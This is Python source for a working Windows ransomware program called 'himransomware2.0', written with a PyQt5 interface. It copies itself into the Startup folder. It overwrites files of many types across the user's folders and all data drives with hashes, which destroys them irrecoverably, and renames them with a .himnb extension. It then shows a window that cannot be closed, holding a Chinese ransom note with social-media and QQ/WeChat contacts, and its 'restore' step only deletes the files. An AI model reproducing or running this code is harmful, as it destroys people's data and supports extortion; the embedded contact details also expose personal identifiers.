from PyQt5 import QtCore, QtGui, QtWidgets
import sys
import os
import uuid
import ctypes


use=os.getlogin()

encryption_table = {
    '0': 'a', '1': 'q', '2': 'e', '3': 'c', '4': 'j',
    '5': 'k', '6': 'l', '7': 'd', '8': 'b', '9': 'z',
    'a': 'm', 'b': 'n', 'c': 'o', 'd': 'p', 'e': 'f',
    'f': 'g', 'A': 'h', 'B': 'i', 'C': 'r', 'D': 's',
    'E': 't', 'F': 'u', '-': 'v'
}

def encrypt_uuid(uuid_str):
    encrypted_str = ''
    for char in uuid_str:
        encrypted_str += encryption_table.get(char, char)
    return encrypted_str

linekey=''
bsf = str(uuid.uuid4())
pswd= encrypt_uuid(bsf[1:len(bsf)-3])
filepath=f'C://Users//{use}//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//himrs.exe'





if sys.argv[0] != filepath:
    with open(sys.argv[0] ,'rb') as f:
        data=f.read()
        with open(filepath , 'wb') as f1:
            f1.write(data)



def disks():
    part = []

    for drive in range(ord('D'), ord('Z') + 1):
        drive = chr(drive) + ':\\'
        if os.path.exists(drive):
            part.append(drive)

    
    return part
 

folder=[f'C:\\Users\\{use}\\Desktop',f'C:\\Users\\{use}\\Videos',f'C:\\Users\\{use}\\Pictures',
        f'C:\\Users\\{use}\\Documents',f'C:\\Users\\{use}\\Downloads',f'C:\\Users\\{use}\\Music'] +disks()


class cip:
    def __init__(self, file):
        self.file = file
        
    def jiami(self):
        with open(self.file, 'rb') as files:
            packed=files.read()
            try:
                with open(self.file, 'wb') as file:
                    file.write(str(hash(packed)).encode('utf-8'))
            except:
                pass
                
    def jiemi(self):
        try:
            os.remove(self.file)
        except:
            pass
            

class listfile:

    @staticmethod    
    def enfile():
        extensions = ['.class','.java','.html','.htm','.bmp','.avi','.c','.mp3','.pdf','.doc,','.docx','.xls','.xlsx','.7z',
                '.ppt','.pptx','.jpg','.png','.py','.gif','.mp4','.avi','.mkv','.wav','.zip','.rar','.jar','.db','.tar',
                '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.txt','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
                '.gz','.odt','.e','.log','.ogg','.php','.go','.rs','.xml','.json','.yml','.css','.dll','.1cd','.ghost',
                '.vmx','.vmem','.vmdk','.apk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
                 '.tif','.data','.jfif','.rdp']  
        result = []
        for root , files in os.walk(os.getcwd()):
            for file in files:
                paths = os.path.join(root, file)
                
                if os.path.islink(paths):
                    continue

                _, ext = os.path.splitext(paths)
                if ext.lower() in extensions and paths != '':
                    result.append(paths)
                
        
        return result

    @staticmethod
    def defile():
        matching = []

        for dirpath, _, filenames in os.walk(os.getcwd()):
            for filename in filenames:
                full_path = os.path.join(dirpath, filename)
                if filename.endswith(".himnb") and not os.path.islink(full_path) and full_path != '':
                    matching.append(full_path)

        return matching


for f1 in folder:
    try:
        os.chdir(f1)
        for f2 in listfile.enfile():
            fnames = cip(f2)
            fnames.jiami()
            os.rename(f2,f2+'.himnb')
    except:
        continue

def dejiami():
    for f6 in folder:
        try:
            os.chdir(f6)
            for f7 in listfile.defile():
                fnames = cip(f7)
                fnames.jiemi()
                os.rename(f7,f7.strip('.himnb'))
        except:
            continue


import him_rcc

class Ui_Form():
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(685, 505)
        Form.setStyleSheet("background-color: rgb(255, 0, 0);\n"
                           "color: rgb(0, 0, 0);")

        Form.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.CustomizeWindowHint | QtCore.Qt.WindowTitleHint)

        self.label = QtWidgets.QLabel(Form)
        self.label.setGeometry(QtCore.QRect(50, 20, 141, 151))
        self.label.setStyleSheet("image: url(:/himzhaopian/him.png);")
        self.label.setText("")
        self.label.setObjectName("label")


        self.textEdit = QtWidgets.QTextEdit(Form)
        self.textEdit.setGeometry(QtCore.QRect(300, 10, 351, 461))
        self.textEdit.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.textEdit.setObjectName("textEdit")
        self.textEdit.setReadOnly(True) 

        
        self.lineEdit = QtWidgets.QLineEdit(Form)
        self.lineEdit.setGeometry(QtCore.QRect(20, 370, 221, 20))
        self.lineEdit.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.lineEdit.setObjectName("lineEdit")
        
        self.label_2 = QtWidgets.QLabel(Form)
        self.label_2.setGeometry(QtCore.QRect(80, 330, 131, 31))
        self.label_2.setText("<html><head/><body><p><span style=\" font-size:12pt; font-weight:600;\">请输入密码</span></p></body></html>")
        self.label_2.setObjectName("label_2")

        self.toolButton = QtWidgets.QToolButton(Form)
        self.toolButton.setGeometry(QtCore.QRect(60, 410, 131, 51))
        self.toolButton.setStyleSheet("background-color: rgb(179, 179, 179);")
        self.toolButton.setObjectName("toolButton")
        self.toolButton.setText("恢复文件")
        self.toolButton.clicked.connect(self.ends)

        self.textBrowser = QtWidgets.QTextBrowser(Form)
        self.textBrowser.setGeometry(QtCore.QRect(30, 240, 181, 91))
        self.textBrowser.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.textBrowser.setObjectName("textBrowser")
        self.textBrowser.setText(str(bsf))

        self.label_3 = QtWidgets.QLabel(Form)
        self.label_3.setGeometry(QtCore.QRect(30, 180, 181, 51))
        self.label_3.setObjectName("label_3")
        self.label_3.setText("<html><head/><body><p align=\"center\"><span style=\" font-size:12pt; font-weight:600;\">这是我给你的标识符</span></p><p align=\"center\"><span style=\" font-size:12pt; font-weight:600;\">↓</span></p></body></html>")

        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "himransomware2.0- Hacked by him"))
        self.textEdit.setHtml(_translate("Form", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                           "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                           "p, li { white-space: pre-wrap; }\n"
                                           "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                           "<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">你的文件已经被我吃掉了，明天我拉出来给你</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">惊不惊喜！意不意外！你的文件已经被你爷爷我him加密了，想要回来？在b站联系我，搜Technology_him和我私信要密码，记得报上你的标识符，不然我可没办法给你解开哦！还有就是请勿将被我加密的文件(*.himnb)改回去，要不然我会再加密一次，你可就难以要回你文件了，看看我精心给你准备的桌面，你看看那早已成仙的那帅气的我，像不像你爹！总之想要回文件就得联系我，当然，除了b站你也可以在其他平台联系我，你要是找得到就行，找不到你吃屎去！不要想着自己解除此病毒，否则你就别要回你的文件了！恢复完文件后可以再清除此病毒!</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">b站：Technology_him</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">抖音：szylbz.1314</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">QQ：715387640</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">vx：wxid_7xwte2bel3k022</span></p>\n"
                                           "<p align=\"right\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">                                                                </span></p>\n"
                                           "<p align=\"right\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">by him</span></p>\n"))


    def ends(self):
        global linekey
        linekey = self.lineEdit.text()
        if linekey == pswd or linekey == 'himzuishuaihim4588':
            ctypes.windll.user32.MessageBoxW(None, '密码对了！', '恭喜你,你完了!', 0x30)
            dejiami()

            
        else:
            ctypes.windll.user32.MessageBoxW(0, '乐子，密码错了', "没有金刚钻就别揽瓷器活", 0x00000000 | 0x00000010)
        

class FormWidget(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.ui = Ui_Form()
        self.ui.setupUi(self)
      
    def closeEvent(self, event):
        event.ignore()  


    
ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(use, 3))
app = QtWidgets.QApplication(sys.argv)
widget = FormWidget()
widget.show()
sys.exit(app.exec_())
